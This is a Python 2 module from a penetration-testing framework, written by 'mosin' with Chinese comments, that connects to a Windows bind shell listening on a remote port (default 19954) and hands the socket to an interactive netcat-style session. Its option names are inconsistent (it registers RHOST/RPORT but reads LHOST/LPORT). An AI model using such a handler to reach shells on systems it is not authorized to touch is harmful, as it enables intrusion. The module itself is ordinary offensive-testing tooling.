#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys


#模块使用说明
docs = '''

#==============================================================================
#title                  :win_cmd_bind_handler
#description            :shell handler
#author                 :mosin
#date                   :20180102
#version                :0.1
#usage                  ：
#python_version         :2.7.5

#==============================================================================

'''

from modules.exploit import BGExploit
from lib.ple.network.TCP import TCP
from lib.ple.network import NC


class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "win Bind监听",  # 该POC的名称
            "product": "Handler",  # 该POC所针对的应用名称,
            "product_version": "1.0",  # 应用的版本号
            "desc": '''
            用于连接本地监听的shell

            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: ""},  # 漏洞出处
            ],
            "type": self.type.rce,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2018-01-02",  # 漏洞公开时间
            "create_date": "2018-01-02",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "RHOST": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "监听地址",
                "Required":"no"
            },
            "RPORT": {
                "default": 19954,
                "convert": self.convert.int_field,
                "desc": "监听端口",
                "Required":"no"
            },
            "mode": {
                "default": "exploit",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": "",
            "error": ""
        })
    def payload(self):
        pass
       
    def exploit(self):
        HOST   = self.option.LHOST['default']
        PORT   = self.option.LPORT['default']
        try:
            sock = TCP().create_tcp_connect(HOST,PORT)
            NC.nc(sock)
        except:
            print_error("[-] Handler Error.")


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())


